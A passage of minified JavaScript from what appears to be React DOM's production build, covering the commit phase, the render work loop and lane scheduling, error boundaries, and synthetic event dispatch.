r=i.shared.hiddenCallbacks;if(r!==null)for(i.shared.hiddenCallbacks=null,i=0;i<r.length;i++)qc(r[i],o)}catch(g){he(l,l.return,g)}}t&&s&64&&Ku(n),bi(n,n.return);break;case 27:ad(n);case 26:case 5:nt(i,n,t),t&&l===null&&s&4&&$u(n),bi(n,n.return);break;case 12:nt(i,n,t);break;case 31:nt(i,n,t),t&&s&4&&sd(i,n);break;case 13:nt(i,n,t),t&&s&4&&od(i,n);break;case 22:n.memoizedState===null&&nt(i,n,t),bi(n,n.return);break;case 30:break;default:nt(i,n,t)}a=a.sibling}}function Mo(e,a){var t=null;e!==null&&e.memoizedState!==null&&e.memoizedState.cachePool!==null&&(t=e.memoizedState.cachePool.pool),e=null,a.memoizedState!==null&&a.memoizedState.cachePool!==null&&(e=a.memoizedState.cachePool.pool),e!==t&&(e!=null&&e.refCount++,t!=null&&ii(t))}function Ro(e,a){e=null,a.alternate!==null&&(e=a.alternate.memoizedState.cache),a=a.memoizedState.cache,a!==e&&(a.refCount++,e!=null&&ii(e))}function za(e,a,t,l){if(a.subtreeFlags&10256)for(a=a.child;a!==null;)ud(e,a,t,l),a=a.sibling}function ud(e,a,t,l){var i=a.flags;switch(a.tag){case 0:case 11:case 15:za(e,a,t,l),i&2048&&vi(9,a);break;case 1:za(e,a,t,l);break;case 3:za(e,a,t,l),i&2048&&(e=null,a.alternate!==null&&(e=a.alternate.memoizedState.cache),a=a.memoizedState.cache,a!==e&&(a.refCount++,e!=null&&ii(e)));break;case 12:if(i&2048){za(e,a,t,l),e=a.stateNode;try{var n=a.memoizedProps,s=n.id,o=n.onPostCommit;typeof o=="function"&&o(s,a.alternate===null?"mount":"update",e.passiveEffectDuration,-0)}catch(r){he(a,a.return,r)}}else za(e,a,t,l);break;case 31:za(e,a,t,l);break;case 13:za(e,a,t,l);break;case 23:break;case 22:n=a.stateNode,s=a.alternate,a.memoizedState!==null?n._visibility&2?za(e,a,t,l):Ai(e,a):n._visibility&2?za(e,a,t,l):(n._visibility|=2,Nl(e,a,t,l,(a.subtreeFlags&10256)!==0||!1)),i&2048&&Mo(s,a);break;case 24:za(e,a,t,l),i&2048&&Ro(a.alternate,a);break;default:za(e,a,t,l)}}function Nl(e,a,t,l,i){for(i=i&&((a.subtreeFlags&10256)!==0||!1),a=a.child;a!==null;){var n=e,s=a,o=t,r=l,g=s.flags;switch(s.tag){case 0:case 11:case 15:Nl(n,s,o,r,i),vi(8,s);break;case 23:break;case 22:var A=s.stateNode;s.memoizedState!==null?A._visibility&2?Nl(n,s,o,r,i):Ai(n,s):(A._visibility|=2,Nl(n,s,o,r,i)),i&&g&2048&&Mo(s.alternate,s);break;case 24:Nl(n,s,o,r,i),i&&g&2048&&Ro(s.alternate,s);break;default:Nl(n,s,o,r,i)}a=a.sibling}}function Ai(e,a){if(a.subtreeFlags&10256)for(a=a.child;a!==null;){var t=e,l=a,i=l.flags;switch(l.tag){case 22:Ai(t,l),i&2048&&Mo(l.alternate,l);break;case 24:Ai(t,l),i&2048&&Ro(l.alternate,l);break;default:Ai(t,l)}a=a.sibling}}var yi=8192;function Ll(e,a,t){if(e.subtreeFlags&yi)for(e=e.child;e!==null;)dd(e,a,t),e=e.sibling}function dd(e,a,t){switch(e.tag){case 26:Ll(e,a,t),e.flags&yi&&e.memoizedState!==null&&Vp(t,wa,e.memoizedState,e.memoizedProps);break;case 5:Ll(e,a,t);break;case 3:case 4:var l=wa;wa=Bn(e.stateNode.containerInfo),Ll(e,a,t),wa=l;break;case 22:e.memoizedState===null&&(l=e.alternate,l!==null&&l.memoizedState!==null?(l=yi,yi=16777216,Ll(e,a,t),yi=l):Ll(e,a,t));break;default:Ll(e,a,t)}}function fd(e){var a=e.alternate;if(a!==null&&(e=a.child,e!==null)){a.child=null;do a=e.sibling,e.sibling=null,e=a;while(e!==null)}}function Ti(e){var a=e.deletions;if((e.flags&16)!==0){if(a!==null)for(var t=0;t<a.length;t++){var l=a[t];je=l,pd(l,e)}fd(e)}if(e.subtreeFlags&10256)for(e=e.child;e!==null;)md(e),e=e.sibling}function md(e){switch(e.tag){case 0:case 11:case 15:Ti(e),e.flags&2048&&Et(9,e,e.return);break;case 3:Ti(e);break;case 12:Ti(e);break;case 22:var a=e.stateNode;e.memoizedState!==null&&a._visibility&2&&(e.return===null||e.return.tag!==13)?(a._visibility&=-3,In(e)):Ti(e);break;default:Ti(e)}}function In(e){var a=e.deletions;if((e.flags&16)!==0){if(a!==null)for(var t=0;t<a.length;t++){var l=a[t];je=l,pd(l,e)}fd(e)}for(e=e.child;e!==null;){switch(a=e,a.tag){case 0:case 11:case 15:Et(8,a,a.return),In(a);break;case 22:t=a.stateNode,t._visibility&2&&(t._visibility&=-3,In(a));break;default:In(a)}e=e.sibling}}function pd(e,a){for(;je!==null;){var t=je;switch(t.tag){case 0:case 11:case 15:Et(8,t,a);break;case 23:case 22:if(t.memoizedState!==null&&t.memoizedState.cachePool!==null){var l=t.memoizedState.cachePool.pool;l!=null&&l.refCount++}break;case 24:ii(t.memoizedState.cache)}if(l=t.child,l!==null)l.return=t,je=l;else e:for(t=e;je!==null;){l=je;var i=l.sibling,n=l.return;if(id(l),l===t){je=null;break e}if(i!==null){i.return=n,je=i;break e}je=n}}}var dp={getCacheForType:function(e){var a=ke(_e),t=a.data.get(e);return t===void 0&&(t=e(),a.data.set(e,t)),t},cacheSignal:function(){return ke(_e).controller.signal}},fp=typeof WeakMap=="function"?WeakMap:Map,ue=0,Ae=null,$=null,ae=0,pe=0,va=null,Ct=!1,Dl=!1,wo=!1,st=0,Ne=0,St=0,$t=0,zo=0,ba=0,Il=0,Ei=null,sa=null,Fo=!1,_n=0,hd=0,Un=1/0,Mn=null,Ot=null,Fe=0,xt=null,_l=null,ot=0,Go=0,jo=null,gd=null,Ci=0,qo=null;function Aa(){return(ue&2)!==0&&ae!==0?ae&-ae:y.T!==null?Yo():Ur()}function vd(){if(ba===0)if((ae&536870912)===0||le){var e=qi;qi<<=1,(qi&3932160)===0&&(qi=262144),ba=e}else ba=536870912;return e=ha.current,e!==null&&(e.flags|=32),ba}function oa(e,a,t){(e===Ae&&(pe===2||pe===9)||e.cancelPendingCommit!==null)&&(Ul(e,0),Nt(e,ae,ba,!1)),kl(e,t),((ue&2)===0||e!==Ae)&&(e===Ae&&((ue&2)===0&&($t|=t),Ne===4&&Nt(e,ae,ba,!1)),Ha(e))}function bd(e,a,t){if((ue&6)!==0)throw Error(p(327));var l=!t&&(a&127)===0&&(a&e.expiredLanes)===0||Bl(e,a),i=l?hp(e,a):Po(e,a,!0),n=l;do{if(i===0){Dl&&!l&&Nt(e,a,0,!1);break}else{if(t=e.current.alternate,n&&!mp(t)){i=Po(e,a,!1),n=!1;continue}if(i===2){if(n=a,e.errorRecoveryDisabledLanes&n)var s=0;else s=e.pendingLanes&-536870913,s=s!==0?s:s&536870912?536870912:0;if(s!==0){a=s;e:{var o=e;i=Ei;var r=o.current.memoizedState.isDehydrated;if(r&&(Ul(o,s).flags|=256),s=Po(o,s,!1),s!==2){if(wo&&!r){o.errorRecoveryDisabledLanes|=n,$t|=n,i=4;break e}n=sa,sa=i,n!==null&&(sa===null?sa=n:sa.push.apply(sa,n))}i=s}if(n=!1,i!==2)continue}}if(i===1){Ul(e,0),Nt(e,a,0,!0);break}e:{switch(l=e,n=i,n){case 0:case 1:throw Error(p(345));case 4:if((a&4194048)!==a)break;case 6:Nt(l,a,ba,!Ct);break e;case 2:sa=null;break;case 3:case 5:break;default:throw Error(p(329))}if((a&62914560)===a&&(i=_n+300-H(),10<i)){if(Nt(l,a,ba,!Ct),Pi(l,0,!0)!==0)break e;ot=a,l.timeoutHandle=Zd(Ad.bind(null,l,t,sa,Mn,Fo,a,ba,$t,Il,Ct,n,"Throttled",-0,0),i);break e}Ad(l,t,sa,Mn,Fo,a,ba,$t,Il,Ct,n,null,-0,0)}}break}while(!0);Ha(e)}function Ad(e,a,t,l,i,n,s,o,r,g,A,C,v,b){if(e.timeoutHandle=-1,C=a.subtreeFlags,C&8192||(C&16785408)===16785408){C={stylesheets:null,count:0,imgCount:0,imgBytes:0,suspenseyImages:[],waitingForImages:!0,waitingForViewTransition:!1,unsuspend:Ya},dd(a,n,C);var U=(n&62914560)===n?_n-H():(n&4194048)===n?hd-H():0;if(U=Kp(C,U),U!==null){ot=n,e.cancelPendingCommit=U(Nd.bind(null,e,a,n,t,l,i,s,o,r,A,C,null,v,b)),Nt(e,n,s,!g);return}}Nd(e,a,n,t,l,i,s,o,r)}function mp(e){for(var a=e;;){var t=a.tag;if((t===0||t===11||t===15)&&a.flags&16384&&(t=a.updateQueue,t!==null&&(t=t.stores,t!==null)))for(var l=0;l<t.length;l++){var i=t[l],n=i.getSnapshot;i=i.value;try{if(!ma(n(),i))return!1}catch{return!1}}if(t=a.child,a.subtreeFlags&16384&&t!==null)t.return=a,a=t;else{if(a===e)break;for(;a.sibling===null;){if(a.return===null||a.return===e)return!0;a=a.return}a.sibling.return=a.return,a=a.sibling}}return!0}function Nt(e,a,t,l){a&=~zo,a&=~$t,e.suspendedLanes|=a,e.pingedLanes&=~a,l&&(e.warmLanes|=a),l=e.expirationTimes;for(var i=a;0<i;){var n=31-fa(i),s=1<<n;l[n]=-1,i&=~s}t!==0&&Dr(e,t,a)}function Rn(){return(ue&6)===0?(Si(0),!1):!0}function Ho(){if($!==null){if(pe===0)var e=$.return;else e=$,Va=kt=null,to(e),El=null,si=0,e=$;for(;e!==null;)Vu(e.alternate,e),e=e.return;$=null}}function Ul(e,a){var t=e.timeoutHandle;t!==-1&&(e.timeoutHandle=-1,Mp(t)),t=e.cancelPendingCommit,t!==null&&(e.cancelPendingCommit=null,t()),ot=0,Ho(),Ae=e,$=t=Xa(e.current,null),ae=a,pe=0,va=null,Ct=!1,Dl=Bl(e,a),wo=!1,Il=ba=zo=$t=St=Ne=0,sa=Ei=null,Fo=!1,(a&8)!==0&&(a|=a&32);var l=e.entangledLanes;if(l!==0)for(e=e.entanglements,l&=a;0<l;){var i=31-fa(l),n=1<<i;a|=e[i],l&=~n}return st=a,en(),t}function yd(e,a){Q=null,y.H=pi,a===Tl||a===cn?(a=zc(),pe=3):a===ks?(a=zc(),pe=4):pe=a===Ao?8:a!==null&&typeof a=="object"&&typeof a.then=="function"?6:1,va=a,$===null&&(Ne=1,Cn(e,xa(a,e.current)))}function Td(){var e=ha.current;return e===null?!0:(ae&4194048)===ae?Ia===null:(ae&62914560)===ae||(ae&536870912)!==0?e===Ia:!1}function Ed(){var e=y.H;return y.H=pi,e===null?pi:e}function Cd(){var e=y.A;return y.A=dp,e}function wn(){Ne=4,Ct||(ae&4194048)!==ae&&ha.current!==null||(Dl=!0),(St&134217727)===0&&($t&134217727)===0||Ae===null||Nt(Ae,ae,ba,!1)}function Po(e,a,t){var l=ue;ue|=2;var i=Ed(),n=Cd();(Ae!==e||ae!==a)&&(Mn=null,Ul(e,a)),a=!1;var s=Ne;e:do try{if(pe!==0&&$!==null){var o=$,r=va;switch(pe){case 8:Ho(),s=6;break e;case 3:case 2:case 9:case 6:ha.current===null&&(a=!0);var g=pe;if(pe=0,va=null,Ml(e,o,r,g),t&&Dl){s=0;break e}break;default:g=pe,pe=0,va=null,Ml(e,o,r,g)}}pp(),s=Ne;break}catch(A){yd(e,A)}while(!0);return a&&e.shellSuspendCounter++,Va=kt=null,ue=l,y.H=i,y.A=n,$===null&&(Ae=null,ae=0,en()),s}function pp(){for(;$!==null;)Sd($)}function hp(e,a){var t=ue;ue|=2;var l=Ed(),i=Cd();Ae!==e||ae!==a?(Mn=null,Un=H()+500,Ul(e,a)):Dl=Bl(e,a);e:do try{if(pe!==0&&$!==null){a=$;var n=va;a:switch(pe){case 1:pe=0,va=null,Ml(e,a,n,1);break;case 2:case 9:if(Rc(n)){pe=0,va=null,Od(a);break}a=function(){pe!==2&&pe!==9||Ae!==e||(pe=7),Ha(e)},n.then(a,a);break e;case 3:pe=7;break e;case 4:pe=5;break e;case 7:Rc(n)?(pe=0,va=null,Od(a)):(pe=0,va=null,Ml(e,a,n,7));break;case 5:var s=null;switch($.tag){case 26:s=$.memoizedState;case 5:case 27:var o=$;if(s?df(s):o.stateNode.complete){pe=0,va=null;var r=o.sibling;if(r!==null)$=r;else{var g=o.return;g!==null?($=g,zn(g)):$=null}break a}}pe=0,va=null,Ml(e,a,n,5);break;case 6:pe=0,va=null,Ml(e,a,n,6);break;case 8:Ho(),Ne=6;break e;default:throw Error(p(462))}}gp();break}catch(A){yd(e,A)}while(!0);return Va=kt=null,y.H=l,y.A=i,ue=t,$!==null?0:(Ae=null,ae=0,en(),Ne)}function gp(){for(;$!==null&&!X();)Sd($)}function Sd(e){var a=Xu(e.alternate,e,st);e.memoizedProps=e.pendingProps,a===null?zn(e):$=a}function Od(e){var a=e,t=a.alternate;switch(a.tag){case 15:case 0:a=Pu(t,a,a.pendingProps,a.type,void 0,ae);break;case 11:a=Pu(t,a,a.pendingProps,a.type.render,a.ref,ae);break;case 5:to(a);default:Vu(t,a),a=$=Cc(a,st),a=Xu(t,a,st)}e.memoizedProps=e.pendingProps,a===null?zn(e):$=a}function Ml(e,a,t,l){Va=kt=null,to(a),El=null,si=0;var i=a.return;try{if(ip(e,i,a,t,ae)){Ne=1,Cn(e,xa(t,e.current)),$=null;return}}catch(n){if(i!==null)throw $=i,n;Ne=1,Cn(e,xa(t,e.current)),$=null;return}a.flags&32768?(le||l===1?e=!0:Dl||(ae&536870912)!==0?e=!1:(Ct=e=!0,(l===2||l===9||l===3||l===6)&&(l=ha.current,l!==null&&l.tag===13&&(l.flags|=16384))),xd(a,e)):zn(a)}function zn(e){var a=e;do{if((a.flags&32768)!==0){xd(a,Ct);return}e=a.return;var t=op(a.alternate,a,st);if(t!==null){$=t;return}if(a=a.sibling,a!==null){$=a;return}$=a=e}while(a!==null);Ne===0&&(Ne=5)}function xd(e,a){do{var t=rp(e.alternate,e);if(t!==null){t.flags&=32767,$=t;return}if(t=e.return,t!==null&&(t.flags|=32768,t.subtreeFlags=0,t.deletions=null),!a&&(e=e.sibling,e!==null)){$=e;return}$=e=t}while(e!==null);Ne=6,$=null}function Nd(e,a,t,l,i,n,s,o,r){e.cancelPendingCommit=null;do Fn();while(Fe!==0);if((ue&6)!==0)throw Error(p(327));if(a!==null){if(a===e.current)throw Error(p(177));if(n=a.lanes|a.childLanes,n|=Ds,Zf(e,t,n,s,o,r),e===Ae&&($=Ae=null,ae=0),_l=a,xt=e,ot=t,Go=n,jo=i,gd=l,(a.subtreeFlags&10256)!==0||(a.flags&10256)!==0?(e.callbackNode=null,e.callbackPriority=0,yp(Ma,function(){return Ud(),null})):(e.callbackNode=null,e.callbackPriority=0),l=(a.flags&13878)!==0,(a.subtreeFlags&13878)!==0||l){l=y.T,y.T=null,i=N.p,N.p=2,s=ue,ue|=4;try{cp(e,a,t)}finally{ue=s,N.p=i,y.T=l}}Fe=1,Ld(),Dd(),Id()}}function Ld(){if(Fe===1){Fe=0;var e=xt,a=_l,t=(a.flags&13878)!==0;if((a.subtreeFlags&13878)!==0||t){t=y.T,y.T=null;var l=N.p;N.p=2;var i=ue;ue|=4;try{rd(a,e);var n=er,s=pc(e.containerInfo),o=n.focusedElem,r=n.selectionRange;if(s!==o&&o&&o.ownerDocument&&mc(o.ownerDocument.documentElement,o)){if(r!==null&&Ss(o)){var g=r.start,A=r.end;if(A===void 0&&(A=g),"selectionStart"in o)o.selectionStart=g,o.selectionEnd=Math.min(A,o.value.length);else{var C=o.ownerDocument||document,v=C&&C.defaultView||window;if(v.getSelection){var b=v.getSelection(),U=o.textContent.length,P=Math.min(r.start,U),be=r.end===void 0?P:Math.min(r.end,U);!b.extend&&P>be&&(s=be,be=P,P=s);var f=fc(o,P),c=fc(o,be);if(f&&c&&(b.rangeCount!==1||b.anchorNode!==f.node||b.anchorOffset!==f.offset||b.focusNode!==c.node||b.focusOffset!==c.offset)){var h=C.createRange();h.setStart(f.node,f.offset),b.removeAllRanges(),P>be?(b.addRange(h),b.extend(c.node,c.offset)):(h.setEnd(c.node,c.offset),b.addRange(h))}}}}for(C=[],b=o;b=b.parentNode;)b.nodeType===1&&C.push({element:b,left:b.scrollLeft,top:b.scrollTop});for(typeof o.focus=="function"&&o.focus(),o=0;o<C.length;o++){var E=C[o];E.element.scrollLeft=E.left,E.element.scrollTop=E.top}}Zn=!!$o,er=$o=null}finally{ue=i,N.p=l,y.T=t}}e.current=a,Fe=2}}function Dd(){if(Fe===2){Fe=0;var e=xt,a=_l,t=(a.flags&8772)!==0;if((a.subtreeFlags&8772)!==0||t){t=y.T,y.T=null;var l=N.p;N.p=2;var i=ue;ue|=4;try{ld(e,a.alternate,a)}finally{ue=i,N.p=l,y.T=t}}Fe=3}}function Id(){if(Fe===4||Fe===3){Fe=0,ne();var e=xt,a=_l,t=ot,l=gd;(a.subtreeFlags&10256)!==0||(a.flags&10256)!==0?Fe=5:(Fe=0,_l=xt=null,_d(e,e.pendingLanes));var i=e.pendingLanes;if(i===0&&(Ot=null),ns(t),a=a.stateNode,da&&typeof da.onCommitFiberRoot=="function")try{da.onCommitFiberRoot(Pl,a,void 0,(a.current.flags&128)===128)}catch{}if(l!==null){a=y.T,i=N.p,N.p=2,y.T=null;try{for(var n=e.onRecoverableError,s=0;s<l.length;s++){var o=l[s];n(o.value,{componentStack:o.stack})}}finally{y.T=a,N.p=i}}(ot&3)!==0&&Fn(),Ha(e),i=e.pendingLanes,(t&261930)!==0&&(i&42)!==0?e===qo?Ci++:(Ci=0,qo=e):Ci=0,Si(0)}}function _d(e,a){(e.pooledCacheLanes&=a)===0&&(a=e.pooledCache,a!=null&&(e.pooledCache=null,ii(a)))}function Fn(){return Ld(),Dd(),Id(),Ud()}function Ud(){if(Fe!==5)return!1;var e=xt,a=Go;Go=0;var t=ns(ot),l=y.T,i=N.p;try{N.p=32>t?32:t,y.T=null,t=jo,jo=null;var n=xt,s=ot;if(Fe=0,_l=xt=null,ot=0,(ue&6)!==0)throw Error(p(331));var o=ue;if(ue|=4,md(n.current),ud(n,n.current,s,t),ue=o,Si(0,!1),da&&typeof da.onPostCommitFiberRoot=="function")try{da.onPostCommitFiberRoot(Pl,n)}catch{}return!0}finally{N.p=i,y.T=l,_d(e,a)}}function Md(e,a,t){a=xa(t,a),a=bo(e.stateNode,a,2),e=At(e,a,2),e!==null&&(kl(e,2),Ha(e))}function he(e,a,t){if(e.tag===3)Md(e,e,t);else for(;a!==null;){if(a.tag===3){Md(a,e,t);break}else if(a.tag===1){var l=a.stateNode;if(typeof a.type.getDerivedStateFromError=="function"||typeof l.componentDidCatch=="function"&&(Ot===null||!Ot.has(l))){e=xa(t,e),t=Ru(2),l=At(a,t,2),l!==null&&(wu(t,l,a,e),kl(l,2),Ha(l));break}}a=a.return}}function Bo(e,a,t){var l=e.pingCache;if(l===null){l=e.pingCache=new fp;var i=new Set;l.set(a,i)}else i=l.get(a),i===void 0&&(i=new Set,l.set(a,i));i.has(t)||(wo=!0,i.add(t),e=vp.bind(null,e,a,t),a.then(e,e))}function vp(e,a,t){var l=e.pingCache;l!==null&&l.delete(a),e.pingedLanes|=e.suspendedLanes&t,e.warmLanes&=~t,Ae===e&&(ae&t)===t&&(Ne===4||Ne===3&&(ae&62914560)===ae&&300>H()-_n?(ue&2)===0&&Ul(e,0):zo|=t,Il===ae&&(Il=0)),Ha(e)}function Rd(e,a){a===0&&(a=Lr()),e=Ht(e,a),e!==null&&(kl(e,a),Ha(e))}function bp(e){var a=e.memoizedState,t=0;a!==null&&(t=a.retryLane),Rd(e,t)}function Ap(e,a){var t=0;switch(e.tag){case 31:case 13:var l=e.stateNode,i=e.memoizedState;i!==null&&(t=i.retryLane);break;case 19:l=e.stateNode;break;case 22:l=e.stateNode._retryCache;break;default:throw Error(p(314))}l!==null&&l.delete(a),Rd(e,t)}function yp(e,a){return G(e,a)}var Gn=null,Rl=null,ko=!1,jn=!1,Jo=!1,Lt=0;function Ha(e){e!==Rl&&e.next===null&&(Rl===null?Gn=Rl=e:Rl=Rl.next=e),jn=!0,ko||(ko=!0,Ep())}function Si(e,a){if(!Jo&&jn){Jo=!0;do for(var t=!1,l=Gn;l!==null;){if(e!==0){var i=l.pendingLanes;if(i===0)var n=0;else{var s=l.suspendedLanes,o=l.pingedLanes;n=(1<<31-fa(42|e)+1)-1,n&=i&~(s&~o),n=n&201326741?n&201326741|1:n?n|2:0}n!==0&&(t=!0,Gd(l,n))}else n=ae,n=Pi(l,l===Ae?n:0,l.cancelPendingCommit!==null||l.timeoutHandle!==-1),(n&3)===0||Bl(l,n)||(t=!0,Gd(l,n));l=l.next}while(t);Jo=!1}}function Tp(){wd()}function wd(){jn=ko=!1;var e=0;Lt!==0&&Up()&&(e=Lt);for(var a=H(),t=null,l=Gn;l!==null;){var i=l.next,n=zd(l,a);n===0?(l.next=null,t===null?Gn=i:t.next=i,i===null&&(Rl=t)):(t=l,(e!==0||(n&3)!==0)&&(jn=!0)),l=i}Fe!==0&&Fe!==5||Si(e),Lt!==0&&(Lt=0)}function zd(e,a){for(var t=e.suspendedLanes,l=e.pingedLanes,i=e.expirationTimes,n=e.pendingLanes&-62914561;0<n;){var s=31-fa(n),o=1<<s,r=i[s];r===-1?((o&t)===0||(o&l)!==0)&&(i[s]=Xf(o,a)):r<=a&&(e.expiredLanes|=o),n&=~o}if(a=Ae,t=ae,t=Pi(e,e===a?t:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),l=e.callbackNode,t===0||e===a&&(pe===2||pe===9)||e.cancelPendingCommit!==null)return l!==null&&l!==null&&_(l),e.callbackNode=null,e.callbackPriority=0;if((t&3)===0||Bl(e,t)){if(a=t&-t,a===e.callbackPriority)return a;switch(l!==null&&_(l),ns(t)){case 2:case 8:t=ka;break;case 32:t=Ma;break;case 268435456:t=Nr;break;default:t=Ma}return l=Fd.bind(null,e),t=G(t,l),e.callbackPriority=a,e.callbackNode=t,a}return l!==null&&l!==null&&_(l),e.callbackPriority=2,e.callbackNode=null,2}function Fd(e,a){if(Fe!==0&&Fe!==5)return e.callbackNode=null,e.callbackPriority=0,null;var t=e.callbackNode;if(Fn()&&e.callbackNode!==t)return null;var l=ae;return l=Pi(e,e===Ae?l:0,e.cancelPendingCommit!==null||e.timeoutHandle!==-1),l===0?null:(bd(e,l,a),zd(e,H()),e.callbackNode!=null&&e.callbackNode===t?Fd.bind(null,e):null)}function Gd(e,a){if(Fn())return null;bd(e,a,!0)}function Ep(){Rp(function(){(ue&6)!==0?G(Ba,Tp):wd()})}function Yo(){if(Lt===0){var e=Al;e===0&&(e=ji,ji<<=1,(ji&261888)===0&&(ji=256)),Lt=e}return Lt}function jd(e){return e==null||typeof e=="symbol"||typeof e=="boolean"?null:typeof e=="function"?e:Yi(""+e)}function qd(e,a){var t=a.ownerDocument.createElement("input");return t.name=a.name,t.value=a.value,e.id&&t.setAttribute("form",e.id),a.parentNode.insertBefore(t,a),e=new FormData(e),t.parentNode.removeChild(t),e}function Cp(e,a,t,l,i){if(a==="submit"&&t&&t.stateNode===i){var n=jd((i[aa]||null).action),s=l.submitter;s&&(a=(a=s[aa]||null)?jd(a.formAction):s.getAttribute("formAction"),a!==null&&(n=a,s=null));var o=new Vi("action","action",null,l,i);e.push({event:o,listeners:[{instance:null,listener:function(){if(l.defaultPrevented){if(Lt!==0){var r=s?qd(i,s):new FormData(i);fo(t,{pending:!0,data:r,method:i.method,action:n},null,r)}}else typeof n=="function"&&(o.preventDefault(),r=s?qd(i,s):new FormData(i),fo(t,{pending:!0,data:r,method:i.method,action:n},n,r))},currentTarget:i}]})}}for(var Qo=0;Qo<Ls.length;Qo++){var Xo=Ls[Qo],Sp=Xo.toLowerCase(),Op=Xo[0].toUpperCase()+Xo.slice(1);Ra(Sp,"on"+Op)}Ra(vc,"onAnimationEnd"),Ra(bc,"onAnimationIteration"),Ra(Ac,"onAnimationStart"),Ra("dblclick","onDoubleClick"),Ra("focusin","onFocus"),Ra("focusout","onBlur"),Ra(Hm,"onTransitionRun"),Ra(Pm,"onTransitionStart"),Ra(Bm,"onTransitionCancel"),Ra(yc,"onTransitionEnd"),nl("onMouseEnter",["mouseout","mouseover"]),nl("onMouseLeave",["mouseout","mouseover"]),nl("onPointerEnter",["pointerout","pointerover"]),nl("onPointerLeave",["pointerout","pointerover"]),Ft("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),Ft("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),Ft("onBeforeInput",["compositionend","keypress","textInput","paste"]),Ft("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),Ft("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),Ft("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Oi="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),xp=new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(Oi));function Hd(e,a){a=(a&4)!==0;for(var t=0;t<e.length;t++){var l=e[t],i=l.event;l=l.listeners;e:{var n=void 0;if(a)for(var s=l.length-1;0<=s;s--){var o=l[s],r=o.instance,g=o.currentTarget;if(o=o.listener,r!==n&&i.isPropagationStopped())break e;n=o,i.currentTarget=g;try{n(i)}catch(A){$i(A)}i.currentTarget=null,n=r}else for(s=0;s<l.length;s++){if(o=l[s],r=o.instance,g=o.currentTarget,o=o.listener,r!==n&&i.isPropagationStopped())break e;n=o,i.currentTarget=g;try{n(i)}catch(A){$i(A)}i.currentTarget=null,n=r}}}}function ee(e,a){var t=a[ss];t===void 0&&(t=a[ss]=new Set);var l=e+"__bubble";t.has(l)||(Pd(a,e,2,!1),t.add(l))}function Zo(e,a,t){var l=0;a&&(l|=4),Pd(t,e,l,a)}var qn="_reactListening"+Math.random().toString(36).slice(2);function Vo(e){if(!e[qn]){e[qn]=!0,wr.forEach(function(t){t!=="selectionchange"&&(xp.has(t)||Zo(t,!1,e),Zo(t,!0,e))});var a=e.nodeType===9?e:e.ownerDocument;a===null||a[qn]||(a[qn]=!0,Zo("selectionchange",!1,a))}}function Pd(e,a,t,l){switch(bf(a)){case 2:var i=eh;break;case 8:i=ah;break;default:i=dr}t=i.bind(null,a,t,e),i=void 0,!hs||a!=="touchstart"&&a!=="touchmove"&&a!=="wheel"||(i=!0),l?i!==void 0?e.addEventListener(a,t,{capture:!0,passive:i}):e.addEventListener(a,t,!0):i!==void 0?e.addEventListener(a,t,{passive:i}):e.addEventListener(a,t,!1)}function Ko(e,a,t,l,i){var n=l;if((a&1)===0&&(a&2)===0&&l!==null)e:for(;;){if(l===null)return;var s=l.tag;if(s===3||s===4){var o=l.stateNode.containerInfo;if(o===i)break;if(s===4)for(s=l.return;s!==null;){var r=s.tag;if((r===3||r===4)&&s.stateNode.containerInfo===i)return;s=s.return}for(;o!==null;){if(s=tl(o),s===null)return;if(r=s.tag,r===5||r===6||r===26||r===27){l=n=s;continue e}o=o.parentNode}}l=l.return}Qr(function(){var g=n,A=ms(t),C=[];e:{var v=Tc.get(e);if(v!==void 0){var b=Vi,U=e;switch(e){case"keypress":if(Xi(t)===0)break e;case"keydown":case"keyup":b=Am;break;case"focusin":U="focus",b=As;break;case"focusout":U="blur",b=As;break;case"beforeblur":case"afterblur":b=As;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":b=Vr;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":b=om;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":b=Em;break;case vc:case bc:case Ac:b=um;break;case yc:b=Sm;break;case"scroll":case"scrollend":b=nm;break;case"wheel":b=xm;break;case"copy":case"cut":case"paste":b=fm;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":b=Wr;break;case"toggle":case"beforetoggle":b=Lm}var P=(a&4)!==0,be=!P&&(e==="scroll"||e==="scrollend"),f=P?v!==null?v+"Capture":null:v;P=[];for(var c=g,h;c!==null;){var E=c;if(h=E.stateNode,E=E.tag,E!==5&&E!==26&&E!==27||h===null||f===null||(E=Ql(c,f),E!=null&&P.push(xi(c,E,h))),be)break;c=c.return}0<P.length&&(v=new b(v,U,null,t,A),C.push({event:v,listeners:P}))}}if((a&7)===0){e:{if(v=e==="mouseover"||e==="pointerover",b=e==="mouseout"||e==="pointerout",v&&t!==fs&&(U=t.relatedTarget||t.fromElement)&&(tl(U)||U[al]))break e;if((b||v)&&(v=A.window===A?A:(v=A.ownerDocument)?v.defaultView||v.parentWindow:window,b?(U=t.relatedTarget||t.toElement,b=g,U=U?tl(U):null,U!==null&&(be=B(U),P=U.tag,U!==be||P!==5&&P!==27&&P!==6)&&(U=null)):(b=null,U=g),b!==U)){if(P=Vr,E="onMouseLeave",f="onMouseEnter",c="mouse",(e==="pointerout"||e==="pointerover")&&(P=Wr,E="onPointerLeave",f="onPointerEnter",c="pointer"),be=b==null?v:Yl(b),h=U==null?v:Yl(U),v=new P(E,c+"leave",b,t,A),v.target=be,v.relatedTarget=h,E=null,tl(A)===g&&(P=new P(f,c+"enter",U,t,A),P.target=h,P.relatedTarget=be,E=P),be=E,b&&U)a:{for(P=Np,f=b,c=U,h=0,E=f;E;E=P(E))h++;E=0;for(var j=c;j;j=P(j))E++;for(;0<h-E;)f=P(f),h--;for(;0<E-h;)c=P(c),E--;for(;h--;){if(f===c||c!==null&&f===c.alternate){P=f;break 